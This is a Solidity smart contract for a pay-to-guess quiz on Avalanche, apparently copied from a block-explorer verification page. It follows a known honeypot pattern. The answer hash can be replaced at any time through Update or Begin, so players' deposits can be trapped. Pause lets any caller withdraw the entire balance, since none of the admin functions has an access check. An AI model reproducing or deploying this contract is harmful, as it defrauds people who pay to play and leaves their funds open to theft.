/**
 *Submitted for verification at snowtrace.io on 2023-07-27
*/

contract AvaxToken {
    function Guess(string memory _response) public payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 0.01 ether) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;
    bytes32 public responseHash;

    function Begin(string calldata _question, string calldata _response) public payable {
        responseHash = keccak256(abi.encode(_response));
        question = _question;
    }

    function Pause() public payable {
        payable(msg.sender).transfer(address(this).balance);
        responseHash = 0x0;
    }

    function Update(string calldata _question, bytes32 _responseHash) public payable {
        question = _question;
        responseHash = _responseHash;
    }

    function Right(string memory _response) public view returns (bool) {
        if(responseHash == keccak256(abi.encode(_response))) {
            return true;
        } else {
            return false;
        }
    }

    constructor() {}
    fallback() external {}
}